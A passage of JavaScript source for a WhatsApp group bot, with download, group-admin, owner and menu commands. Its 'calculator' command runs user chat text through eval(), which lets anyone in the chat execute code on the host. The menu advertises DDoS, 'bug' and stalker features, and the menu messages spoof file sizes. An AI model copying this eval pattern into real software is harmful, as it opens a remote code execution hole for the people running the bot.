                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ThugBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'anticall': {
    if (!ThugTheCreator) return reply(mess.owner)
    if (args[0] === 'on') {
        db.data.chats[m.chat].anticall = true;
        reply(`*${command} has been enabled*`);
    } else if (args[0] === 'off') {
        db.data.chats[m.chat].anticall = false;
        reply(`*${command} has been disabled*`);
    } else {
        return reply(`*On or Off?*`);
    }
    break;
} 
case 'antidelete': {
        if (!m.isGroup) return reply(mess.group)
    if (!isBotAdmins) return reply(mess.botadmin)
    if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
               if (args.length < 1) return reply('*On/Off?*')
               if (args[0] === 'on') {
                if (db.data.chats[frommeky].antidelete) return reply('*Feature already on standby*');
                  db.data.chats[frommeky].antidelete = true
                  reply(`*${command} has been enabled*`)
               } else if (args[0] === 'off') {
                if (db.data.chats[frommeky].antidelete) return reply('*Feature already on standby*');
                  db.data.chats[frommeky].antidelete = false
                  reply(`*${command} has been disabled*`)
               }
            }
case 'autoblock':
                if (!ThugTheCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`*On/Off?*`)
                if (q == 'on') {
                    db.data.settings[botNumber].autoblocknum = true
                    reply(`*Autoblock has been enabled*`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autoblocknum = false
                    reply(`*Autoblock has been disabled*`)
                }
            break
case 'welcome':
            case 'goodbye': {
              if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
               if (args.length < 1) return reply('*On/Off?*')
               if (args[0] === 'on') {
                  welcome = true
                  reply(`*${command} has been enabled*`)
               } else if (args[0] === 'off') {
                  welcome = false
                  reply(`*${command} has been disabled*`)
               }
            }
            break
case 'tourl': {
  if (!isMedia) return reply("Where Is The Media?");
  await loading()
  let media = await ThugBotInc.downloadAndSaveMediaMessage(quoted);
  let mediaUrl = await TelegraPH(m, mime);  // Call the media upload function

  if (mediaUrl.startsWith("http")) {  // If media was successfully uploaded
    reply('*Url :* ' + mediaUrl);  // Reply with the media URL
  } else {
    reply(mediaUrl);  // If the response was an error message
  }
}
break;
case 'ytmp3': case 'ytaudio': {
    if (!text) return reply(`*🚫 REQUEST ERROR!!*\n*Example: ${prefix + command} <YouTube link>*`);

    try {
        reply('*⏳ Fetching your audio... Please wait, this may take 1-3 minutes if the video duration is long!*');

        let response = await axios.get(`https://apis.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(text)}`);

        if (response.data && response.data.success) {
            let audioData = response.data.result;

            await ThugBotInc.sendMessage(
                m.chat, 
                {
                    audio: { url: audioData.download_url },
                    mimetype: 'audio/mp4',
                    fileName: `${audioData.title}.mp3`,
                    caption: `🎵 *Title:* ${audioData.title}\n📥 *Size:* ${audioData.size}\n\nEnjoy your music! ✅`
                }, 
                { quoted: m }
            );
        } else {
            reply('*❌ Failed to retrieve audio. Please check the link and try again!*');
        }
    } catch (error) {
        console.error('YTMP3 Error:', error); // Logs the error for debugging
        reply('*⚠️ An Error Occurred:* ' + (error.response?.data?.message || error.message));
    }
}
break;




case 'ytmp4': {
    try {
        if (!text) return reply(`*Provide a YouTube link*`);

        const axios = require("axios");
        const yts = require("yt-search");

        await loading();

        // Notify user that the video is being downloaded
        await reply(`*📥 Downloading your video*\n*Please wait, this may take 1-3 minutes if the video duration is long!*`);

        // Fetch download link from API
        const apiUrl = `https://apis.davidcyriltech.my.id/download/ytmp4?url=${encodeURIComponent(text)}`;
        const apiResponse = await axios.get(apiUrl);

        // Check if API returned a valid response
        if (apiResponse.data.success && apiResponse.data.result) {
            const { download_url, size, title } = apiResponse.data.result;

            // Send the video
            await ThugBotInc.sendMessage(m.chat, {
                video: { url: download_url },
                mimetype: 'video/mp4',
                fileName: `${title}.mp4`,
                caption: `🎬 *Title:* ${title}\n\n*© 𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐓𝐡𝐮𝐠𝐧𝐢𝐟𝐢𝐜𝐞𝐧𝐭 𝐓𝐞𝐜𝐡™*`
            }, { quoted: m });

        } else {
            await reply(`*Failed to fetch the video! Please try again later.*`);
        }
    } catch (error) {
        console.error('Error during /ytmp4 command:', error);
        await reply(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}






case 'video': {
    if (!text) return reply(`*Example: ${prefix + command} migraines by boywithuke*`);

    try {
        await ThugBotInc.sendMessage(m.chat, { react: { text: `🎥`, key: m?.key } });
        await reply(`*📥 Downloading your video*\n*Please wait, this may take 1-3 minutes if the video is long!*`);

        const yts = require("yt-search");
        const axios = require("axios");

        let search = await yts(text);
        if (!search || !search.all.length) return reply(`*No results found for:* ${text}`);

        let video = search.all[0]; 
        
        const apiUrl = `https://apis.davidcyriltech.my.id/download/ytmp4`;
        const apiResponse = await axios.get(apiUrl, { params: { url: video.url } });

        if (!apiResponse.data.success) return reply(`*Error fetching the video! Please try again later.*`);

        const { title, download_url } = apiResponse.data.result;

        await ThugBotInc.sendMessage(m.chat, {
            video: { url: download_url },
            mimetype: 'video/mp4',
            caption: `*🎬 Video Downloaded!*\n\n` +
                     `📜 *Title:* ${video.title}\n` +
                     `👀 *Views:* ${video.views}\n` +
                     `⌛ *Duration:* ${video.timestamp}\n` +
                     `📈 *Uploaded:* ${video.ago}\n` +
                     `🔗 *Url:* ${video.url}\n\n` +
                     `> *© 𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐓𝐡𝐮𝐠𝐧𝐢𝐟𝐢𝐜𝐞𝐧𝐭 𝐓𝐞𝐜𝐡™*`
        }, { quoted: m });

    } catch (error) {
        console.error('Error during video command:', error);
        reply(`*❌ An error occurred while processing your request. Please try again later.*`);
    }
    break;
}

case 'calculator': case 'cal': {
    try {

        // Get the expression from the user input
        const expression = text.trim();

        // Validate the expression (make sure it's not empty)
        if (!expression) {
            return reply("*Please provide a valid arithmetic expression. Example:* `5 + 5`\n*Addition: +*\n*Multiplication: **\n*Division: /*\n*Subtraction: -*");
        }

        // Perform the calculation
        const result = eval(expression); // Use eval to calculate the result

        // Handle invalid or complex expressions that eval might not handle
        if (isNaN(result)) {
            return reply("Invalid expression! Please enter a valid arithmetic expression.");
        }

        // Send the result of the calculation
        reply(`The result of \`${expression}\` is: *${result}*`);
    } catch (error) {
        console.error(`Error in 'calculator':`, error);
        reply("An error occurred while processing the calculation. Please try again later.");
    }
    break;
}
case 'save': {
    if (!ThugTheCreator) return reply(mess.owner)
    try {
        // Check if a quoted message is available
        if (!quoted) {
            return reply('*Please reply to a media message (image, video, or audio).*');
        }

        // Check mime type of the media
        let mime = quoted.mimetype;
        let mediaType;

        // Determine the media type (image, video, or audio)
        if (/video/.test(mime)) {
            mediaType = 'video';
        } else if (/image/.test(mime)) {
            mediaType = 'image';
        } else if (/audio/.test(mime)) {
            mediaType = 'audio';
        } else {
            return reply('*Reply to a video, image, or audio status.*');
        }

        // Download and save the media file
        var mediaFile = await ThugBotInc.downloadAndSaveMediaMessage(quoted);
        
        // Prepare the message options with the media file
        let messageOptions = {
            caption: q ? q : '',  // Use the caption if provided, otherwise use an empty string
        };

        // Assign the correct media type to messageOptions
        messageOptions[mediaType] = {
            url: mediaFile
        };

        // Send the media to the user
        await ThugBotInc.sendMessage(m.sender, messageOptions, { quoted: m });
        
        // Confirm the action
        await reply('*Media saved successfully*');
    } catch (error) {
        console.error(error);
        reply('Failed to save and send the media. Please try again later.');
    }
    break;
}
case 'delppgc': {
if (!m.isGroup) return reply(mess.group)  
await ThugBotInc.removeProfilePicture(frommeky)
await reply(`*Successfully Deleted Group Photo*`)
}
break

case 'getnamegc': case 'getgcname': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !ThugTheCreator) return reply(mess.admin) 
reply(`${groupMetadata.subject}`)
}
break

case 'getdesgc': case 'getgcdesc': {
if (!m.isGroup) return reply(mess.group)   
reply(`${groupMetadata.desc}`)
}
break



case 'getppgc': {
if (!m.isGroup) return reply(mess.group)
try {
avatar = await ThugBotInc.profilePictureUrl(m.chat, "image")
} catch {
avatar = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
ThugBotInc.sendMessage(m.chat, {image: {url: avatar }, caption: `> © 𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐓𝐡𝐮𝐠𝐧𝐢𝐟𝐢𝐜𝐞𝐧𝐭 𝐓𝐞𝐜𝐡™` }, {quoted: m })
}
break
case 'getppuser': case 'getpp': case 'getuserpp': {
    if (!m.quoted) return reply(`*Please reply to a user's message to fetch their profile picture.*`);

    try {
        // Determine the target user from the quoted message
        const target = m.quoted.sender;

        // Fetch the user's profile picture
        const avatar = await ThugBotInc.profilePictureUrl(target, "image");

        // Send the profile picture back
        await ThugBotInc.sendMessage(
            m.chat, 
            { 
                image: { url: avatar }, 
                caption: `*Here is the profile picture of the quoted user.*` 
            }, 
            { quoted: m }
        );
    } catch (err) {
        // Handle errors (e.g., no profile picture or failed request)
        console.error("Error fetching profile picture:", err);
        const defaultAvatar = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg';

        // Send the default avatar back
        await ThugBotInc.sendMessage(
            m.chat, 
            { 
                image: { url: defaultAvatar }, 
                caption: `*Could not fetch the profile picture. Here is the default avatar instead.*` 
            }, 
            { quoted: m }
        );
    }
    break;
}



case 'imgscan': {
    await ThugBotInc.sendMessage(m?.chat, { react: { text: `⏳`, key: m?.key } });

    try {
        let q = m.quoted || m;
        let mime = (q.msg || q)?.mimetype || q.mediaType || "";

        if (!mime?.startsWith('image')) {
            return reply("*Please respond to an image*");
        }

        let data = await q.download();
        if (!data) {
            return reply("*Error: Unable to download image.*");
        }

        let media = await ThugBotInc.downloadAndSaveMediaMessage(q);
        if (!media) {
            return reply("*Error: Unable to process image.*");
        }

        let mediaUrl = await handleMediaUpload(m, mime);
        if (!mediaUrl?.startsWith("http")) {
            return reply("*Error: Unable to upload image.*");
        }

        const res = await fetch(`https://apis.davidcyriltech.my.id/imgscan?url=${encodeURIComponent(mediaUrl)}`);
        if (!res) {
            throw new Error(await res.text());
        }

        const json = await res.json();
        const { result } = json;
        const message = `*🔍 Image Scan Result 🔎*\n\n📑 *Name:* ${result}`;

        // Send the message using replygcxlicon
        return reply(message);

    } catch (error) {
        console.error(error);
        return reply("*An error occurred while processing the image.*");
    }
}








case 'sudo': case 'setsudo': {
let own = JSON.parse(fs.readFileSync('./database/owner.json').toString()) 
if (!ThugTheCreator) return reply(mess.owner)
if (!m?.quoted) return reply(`*Example: ${prefix+command} tag/reply to a user*`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')
own.push(users)
fs.writeFileSync('./database/owner.json', JSON.stringify(own))
reply(`*Successfully added user to owner database*`)
}
break
case 'delsudo': {
let own = JSON.parse(fs.readFileSync('./database/owner.json').toString())
if (!ThugTheCreator) return reply(mess.owner) 
if (!m?.quoted) return reply(`*Example: ${prefix+command} tag/reply to a user*`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.split("|")[0].replace(/[^0-9]/g, '')
own.splice(users, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(own))
reply(`*Succesfully removed user from owner database*`)
}
break 
case 'git': case 'gitclone':
        if (!args[0]) return reply(`*Provide a valid GitHub link*\n*Example :*\n*${prefix}${command}* https://github.com/DEMONST3R-CODER/Oreki_V2`)
        if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`*Link invalid!!*`)
        await loading()        
        let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
            let [, repo] = args[0].match(regex1) || []
            repo = repo.replace(/.git$/, '')
            let url = `https://api.github.com/repos/${user}/${repo}/zipball`
            let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
            ThugBotInc.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply('*Error*'))
        break
case 'linkgroup':
            case 'linkgrup':
            case 'linkgc':
            case 'gclink':
            case 'grouplink':
            case 'gruplink':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botadmin)
                let response = await ThugBotInc.groupInviteCode(m.chat)
                ThugBotInc.sendText(m.chat, `*📝 Name : ${groupMetadata.subject}*\n*👤 Group owner:* ${groupMetadata.owner !== undefined ? '+'+ groupMetadata.owner.split`@`[0] : 'Not known'}\n📑 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Members : ${groupMetadata.participants.length}*\n`, m, {
                    detectLink: true
                })
            break
            
const delay = ms => new Promise(resolve => setTimeout(resolve, ms)); // Helper function to create a delay

case 'menu':
case 'help': {
  // Show a loading indicator
  await loading();

  // Prepare owner information and timing details
  let ownernya = ownernumber + '@s.whatsapp.net';
  let timestampe = speed();
  let latensie = speed() - timestampe;
  let me = m.sender;

  // Construct the menu string with dynamic values
  let xmenu_oh = `
𝕾𝖆𝖑𝖚𝖙𝖆𝖙𝖎𝖔𝖓𝖘 👋 ${pushname}${readmore}
╔═══════ ༻❁༺ ═══════╗
       *「 👑 ᎧᏒᏋᏦᎥ Ꮙ2 👑 」*
╚═══════ ༻❁༺ ═══════╝
╔═══════ ༻❁༺ ═══════╗
        *👨‍🔧 🅱︎🄾🆃︎ 🄸🅽︎🄵🅾︎ 👨‍🔧*
│ ⛈️ *𝚂𝙿𝙴𝙴𝙳: ${latensie.toFixed(4)} 𝚖𝚜*
│ 🕒 *𝚄𝙿𝚃𝙸𝙼𝙴: ${runtime(process.uptime())}*
│ 🤖 *𝙱𝙾𝚃: ${botname}*
│ 👑 *𝙾𝚆𝙽𝙴𝚁𝙽𝚄𝙼𝙱𝙴𝚁:* +${ownernumber}
│ 🎮 *𝙼𝙾𝙳𝙴: ${ThugBotInc.public ? '𝙿𝚄𝙱𝙻𝙸𝙲' : '𝚂𝙴𝙻𝙵'}*
│ 📑 *𝙲𝙾𝙼𝙼𝙰𝙽𝙳𝚂: ${thugfeature()}*
│ 🌐 *𝙷𝙾𝚂𝚃: ${os.hostname()}*
│ 🖥 *𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: ${os.platform()}*
│ 💬 *𝚃𝙾𝚃𝙰𝙻 𝙲𝙷𝙰𝚃𝚂: ${Object.keys(global.db.data.chats).length}*
│ 🌏 *𝙻𝙾𝙲𝙰𝚃𝙸𝙾𝙽: ${location || '𝚄𝙽𝙰𝚅𝙰𝙸𝙻𝙰𝙱𝙻𝙴'}*
│ 🗓 *𝙳𝙰𝚃𝙴: ${xdate || '𝚄𝙽𝙺𝙽𝙾𝚆𝙽'}*
│ 🕰 *𝚃𝙸𝙼𝙴: ${xtime || '𝚄𝙽𝙺𝙽𝙾𝚆𝙽'} 𝚆.𝙰.𝚃*
╚═══════ ༻❁༺ ═══════╝

╭── ❀ *𝚂𝙴𝙻𝙴𝙲𝚃 𝙰𝙽 𝙾𝙿𝚃𝙸𝙾𝙽* ❀ ──╮
│ ❀ │ 𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄 👨‍💼
│ ❀ │ 𝙶𝚁𝙾𝚄𝙿𝙼𝙴𝙽𝚄 👥
│ ❀ │ 𝚂𝚃𝙰𝙻𝙺𝙴𝚁𝙼𝙴𝙽𝚄 🥷
│ ❀ │ 𝚁𝙴𝙻𝙸𝙶𝙸𝙾𝙽𝙼𝙴𝙽𝚄 ⛪
│ ❀ │ 𝚂𝙴𝙰𝚁𝙲𝙷𝙼𝙴𝙽𝚄 🔍
│ ❀ │ 𝙰𝙽𝙸𝙼𝙴𝙼𝙴𝙽𝚄 🙀
│ ❀ │ 𝙰𝙸𝙼𝙴𝙽𝚄 🤖
│ ❀ │ 𝚁𝙴𝙰𝙲𝚃𝙸𝙾𝙽𝙼𝙴𝙽𝚄 👀
│ ❀ │ 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙼𝙴𝙽𝚄 📥
│ ❀ │ 𝙳𝙳𝙾𝚂𝙼𝙴𝙽𝚄 👨‍💻
│ ❀ │ 𝙵𝚄𝙽𝙼𝙴𝙽𝚄 ⚽
│ ❀ │ 𝙽𝙴𝚆𝚂𝙼𝙴𝙽𝚄 🗞️
│ ❀ │ 𝙴𝙲𝙾𝙽𝙾𝙼𝚈𝙼𝙴𝙽𝚄 💱
│ ❀ │ 𝙲𝙾𝙽𝚅𝙴𝚁𝚃𝙼𝙴𝙽𝚄 🔁
│ ❀ │ 𝙿𝚃𝙴𝚁𝙾𝙳𝙰𝙲𝚃𝚈𝙻𝙼𝙴𝙽𝚄 🖥️
│ ❀ │ 𝙽𝚂𝙵𝚆𝙼𝙴𝙽𝚄 🔞
│ ❀ │ 𝙱𝚄𝙶𝙼𝙴𝙽𝚄 🗿
│ ❀ │ 𝙾𝚃𝙷𝙴𝚁𝙼𝙴𝙽𝚄 👨‍🔧
╰──❀༻❁༺༻❁༺༻❁༺❀─╯`;

  // Sending a document message with an external ad reply
await ThugBotInc.sendMessage(m.chat, {
            document: {
                url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
            },
            caption: xmenu_oh,
            mimetype: 'application/zip',
            fileName: ownername,
            fileLength: "99999999999999",
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync('./T-Media/Oreki7.jpg'),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, {
            quoted: fstatus 
        });
  // Sending an MP3 audio file if it exists
  const musicFilePath = './T-Media/menu.mp3';
  if (fs.existsSync(musicFilePath)) {
    await ThugBotInc.sendMessage(
      m.chat,
      {
        audio: { url: musicFilePath },
        mimetype: 'audio/mpeg', // Use 'audio/mpeg' for MP3 files
        ptt: true // This marks the audio as push-to-talk (voice note)
      },
      { quoted: m }
    );
  } else {
    console.error("Audio file not found: " + musicFilePath);
  }

break;
}


case 'ownermenu': {
let xmenu_oh = `𝕾𝖆𝖑𝖚𝖙𝖆𝖙𝖎𝖔𝖓𝖘 👋 ${pushname}\n${readmore}\n\n${ownermenu(prefix, hituet)}`
await ThugBotInc.sendMessage(m.chat, {
            document: {
                url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
            },
            caption: xmenu_oh,
            mimetype: 'application/zip',
            fileName: ownername,
            fileLength: "99999999999999",
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync('./T-Media/Oreki4.jpg'),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, {
            quoted: fstatus 
        });
    }
    break;
    case 'reactionmenu': {
let xmenu_oh = `𝕾𝖆𝖑𝖚𝖙𝖆𝖙𝖎𝖔𝖓𝖘 👋 ${pushname}\n${readmore}\n\n${reactionmenu(prefix, hituet)}`
await ThugBotInc.sendMessage(m.chat, {
            document: {
                url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
            },
            caption: xmenu_oh,
            mimetype: 'application/zip',
            fileName: ownername,
            fileLength: "99999999999999",
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync('./T-Media/Oreki18.jpg'),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, {
            quoted: fstatus 
        });
    }
    break;

case 'groupmenu': {
let xmenu_oh = `𝕾𝖆𝖑𝖚𝖙𝖆𝖙𝖎𝖔𝖓𝖘 👋 ${pushname}\n${readmore}\n\n${groupmenu(prefix, hituet)}`
await ThugBotInc.sendMessage(m.chat, {
            document: {
                url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
            },
            caption: xmenu_oh,
            mimetype: 'application/zip',
            fileName: ownername,
            fileLength: "99999999999999",
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync('./T-Media/Oreki5.jpg'),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, {
            quoted: fstatus 
        });
    }
    break;
case 'stalkmenu': case 'stalkermenu': {
let xmenu_oh = `𝕾𝖆𝖑𝖚𝖙𝖆𝖙𝖎𝖔𝖓𝖘 👋 ${pushname}\n${readmore}\n\n${stalkmenu(prefix, hituet)}`
await ThugBotInc.sendMessage(m.chat, {
            document: {
                url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
            },
            caption: xmenu_oh,
            mimetype: 'application/zip',
            fileName: ownername,
            fileLength: "99999999999999",
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync('./T-Media/Oreki6.jpg'),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, {
            quoted: fstatus 
        });
    }
    break;
case 'religionmenu': {
let xmenu_oh = `𝕾𝖆𝖑𝖚𝖙𝖆𝖙𝖎𝖔𝖓𝖘 👋 ${pushname}\n${readmore}\n\n${religionmenu(prefix, hituet)}`
await ThugBotInc.sendMessage(m.chat, {
            document: {
                url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
            },
            caption: xmenu_oh,
            mimetype: 'application/zip',
            fileName: ownername,
            fileLength: "99999999999999",
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync('./T-Media/Oreki7.jpg'),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, {
            quoted: fstatus 
        });
    }
    break;
case 'searchmenu': {
  // Ensure these variables are defined somewhere in your project:
  // pushname, readmore, allmenu, prefix, hituet, ownername, botname, wagc, fstatus

  // Build the menu text using template literals.
  let xmenu_oh = `𝕾𝖆𝖑𝖚𝖙𝖆𝖙𝖎𝖔𝖓𝖘 👋 ${pushname}\n${readmore}\n\n${searchmenu(prefix, hituet)}`;

  // Send the message with a document attachment.
  await ThugBotInc.sendMessage(
    m.chat,
    {
      document: {
        url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
      },
      caption: xmenu_oh,
      // If the file is indeed a zip file, leave mimetype as is.
      // Otherwise, change it to match the file type, e.g., 'image/png'.
      mimetype: 'application/zip',
      fileName: ownername,
      // fileLength can be a number or string depending on the API—ensure this is valid.
      fileLength: "99999999999999",
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          title: botname,
          body: ownername,
          thumbnail: fs.readFileSync('./T-Media/Oreki8.jpg'),
          sourceUrl: wagc,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    },
    { quoted: fstatus }
  );
}
break;

case 'animemenu': {
let xmenu_oh = `𝕾𝖆𝖑𝖚𝖙𝖆𝖙𝖎𝖔𝖓𝖘 👋 ${pushname}\n${readmore}\n\n${animemenu(prefix, hituet)}`
await ThugBotInc.sendMessage(m.chat, {
            document: {
                url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
            },
            caption: xmenu_oh,
            mimetype: 'application/zip',
            fileName: ownername,
            fileLength: "99999999999999",
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync('./T-Media/Oreki9.jpg'),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, {
            quoted: fstatus 
        });
    }
    break;
case 'aimenu': {
let xmenu_oh = `𝕾𝖆𝖑𝖚𝖙𝖆𝖙𝖎𝖔𝖓𝖘 👋 ${pushname}\n${readmore}\n\n${aimenu(prefix, hituet)}`
await ThugBotInc.sendMessage(m.chat, {
            document: {
                url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
            },
            caption: xmenu_oh,
            mimetype: 'application/zip',
            fileName: ownername,
            fileLength: "99999999999999",
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync('./T-Media/Oreki10.jpg'),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, {
            quoted: fstatus 
        });
    }
    break;
case 'downloadmenu': {
let xmenu_oh = `𝕾𝖆𝖑𝖚𝖙𝖆𝖙𝖎𝖔𝖓𝖘 👋 ${pushname}\n${readmore}\n\n${downloadmenu(prefix, hituet)}`
await ThugBotInc.sendMessage(m.chat, {
            document: {
                url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
            },
            caption: xmenu_oh,
            mimetype: 'application/zip',
            fileName: ownername,
            fileLength: "99999999999999",
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync('./T-Media/Oreki11.jpg'),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, {
            quoted: fstatus 
        });
    }
    break;
case 'ddosmenu': {
let xmenu_oh = `𝕾𝖆𝖑𝖚𝖙𝖆𝖙𝖎𝖔𝖓𝖘 👋 ${pushname}\n${readmore}\n\n${ddosmenu(prefix, hituet)}`
await ThugBotInc.sendMessage(m.chat, {
            document: {
                url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
            },
            caption: xmenu_oh,
            mimetype: 'application/zip',
            fileName: ownername,
            fileLength: "99999999999999",
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync('./T-Media/Oreki12.jpg'),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, {
            quoted: fstatus 
        });
    }
    break;
case 'funmenu': {
let xmenu_oh = `𝕾𝖆𝖑𝖚𝖙𝖆𝖙𝖎𝖔𝖓𝖘 👋 ${pushname}\n${readmore}\n\n${funmenu(prefix, hituet)}`
await ThugBotInc.sendMessage(m.chat, {
            document: {
                url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
            },
            caption: xmenu_oh,
            mimetype: 'application/zip',
            fileName: ownername,
            fileLength: "99999999999999",
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync('./T-Media/Oreki13.jpg'),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, {
            quoted: fstatus 
        });
    }
    break;
case 'gamemenu': {
let xmenu_oh = `𝕾𝖆𝖑𝖚𝖙𝖆𝖙𝖎𝖔𝖓𝖘 👋 ${pushname}\n${readmore}\n\n${gamemenu(prefix, hituet)}`
await ThugBotInc.sendMessage(m.chat, {
            document: {
                url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
            },
            caption: xmenu_oh,
            mimetype: 'application/zip',
            fileName: ownername,
            fileLength: "99999999999999",
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync('./T-Media/Oreki14.jpg'),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, {
            quoted: fstatus 
        });
    }
    break;
case 'newsmenu': {
let xmenu_oh = `𝕾𝖆𝖑𝖚𝖙𝖆𝖙𝖎𝖔𝖓𝖘 👋 ${pushname}\n${readmore}\n\n${newsmenu(prefix, hituet)}`
await ThugBotInc.sendMessage(m.chat, {
            document: {
                url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
            },
            caption: xmenu_oh,
            mimetype: 'application/zip',
            fileName: ownername,
            fileLength: "99999999999999",
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync('./T-Media/Oreki15.jpg'),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, {
            quoted: fstatus 
        });
    }
    break;    
 case 'economymenu': {
let xmenu_oh = `𝕾𝖆𝖑𝖚𝖙𝖆𝖙𝖎𝖔𝖓𝖘 👋 ${pushname}\n${readmore}\n\n${economymenu(prefix, hituet)}`
await ThugBotInc.sendMessage(m.chat, {
            document: {
                url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
            },
            caption: xmenu_oh,
            mimetype: 'application/zip',
            fileName: ownername,
            fileLength: "99999999999999",
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync('./T-Media/Oreki16.jpg'),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, {
            quoted: fstatus 
        });
    }
    break;   
    
case 'convertmenu': {
let xmenu_oh = `𝕾𝖆𝖑𝖚𝖙𝖆𝖙𝖎𝖔𝖓𝖘 👋 ${pushname}\n${readmore}\n\n${convertmenu(prefix, hituet)}`
await ThugBotInc.sendMessage(m.chat, {
            document: {
                url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
            },
            caption: xmenu_oh,
            mimetype: 'application/zip',
            fileName: ownername,
            fileLength: "99999999999999",
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync('./T-Media/Oreki17.jpg'),
                    sourceUrl: wagc,
